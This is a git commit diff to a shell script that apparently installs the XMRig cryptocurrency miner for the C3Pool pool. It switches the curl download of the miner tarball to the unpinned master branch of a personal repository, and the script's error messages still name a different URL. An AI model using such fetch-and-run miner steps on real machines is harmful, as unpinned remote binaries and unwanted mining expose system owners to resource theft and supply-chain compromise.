607086a6199f82c52239d60221a16535473ec218
ssrugger <40933665+ssrugger@users.noreply.github.com>
2021-08-13 15:26:21 +0800

    Update miner_x86-64.sh

--- xmrig/sh/miner_x86-64.sh
+++ xmrig/sh/miner_x86-64.sh
@@ -166,7 +166,7 @@ rm -rf $HOME/c3pool
 
 echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
 echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
-if ! curl -L --progress-bar "https://cdn.jsdelivr.net/gh/ssrugger/rrs@1.0/xmrig/xmr_x86-64.tar.gz" -o /tmp/xmrig.tar.gz; then
+if ! curl -L --progress-bar "https://cdn.jsdelivr.net/gh/ssrugger/rrs@master/xmrig/xmr_x86-64.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   echo "发生错误: 无法下载 http://download.c3pool.com/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
   exit 1
